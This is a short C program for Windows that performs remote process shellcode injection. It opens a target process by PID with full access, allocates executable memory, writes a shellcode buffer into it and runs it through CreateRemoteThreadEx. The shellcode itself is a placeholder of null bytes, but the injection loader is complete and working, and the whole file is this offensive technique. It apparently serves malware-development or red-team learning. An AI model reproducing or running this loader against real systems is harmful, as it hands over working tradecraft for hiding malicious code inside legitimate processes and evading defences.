#include <windows.h>
#include <stdio.h>

DWORD TID, PID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

//define shellcode for later use
unsigned char shellcode[] = {"\x00\x00\x00\x00\x00"};

int main(int argc, char* argv[]) {
    
    //check that program was run with a PID argument
    if (argc < 2) {
        printf("run using <program.exe> PID");
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    printf("trying to open handle to process (%ld)", PID);

    //get a handle into the provided PID and save handle as hProcess
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    //check if successfully got handle, if not exit 
    if (hProcess == NULL) {
        printf("\nFailed to get handle. Error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("Got a handle on: 0x%p\n", hProcess);

    //allocate memory in the process large enough to fit shellcode
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, 0x40);
    printf("Allocated %zu-bytes", sizeof(shellcode));

    //write the shellcode into the newly allocated slot of memory
    WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
    printf("Wrote %zu-bytes to memory\n", sizeof(shellcode));

    //create thread within the process and execute the shellcode within the new thread
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, &TID);

    //check if thread was sucessfully created, if not exit
    if (hThread == NULL) {
        printf("Failed creating thread. Error: %ld\n", GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("Thread successfully created! %ld\n0x%p\n", TID, hThread);

    //cleanup after new thread is executed and exit
    CloseHandle(hProcess);
    CloseHandle(hThread);
    printf("Process complete and mess cleaned up! Closing...");

    return EXIT_SUCCESS;
}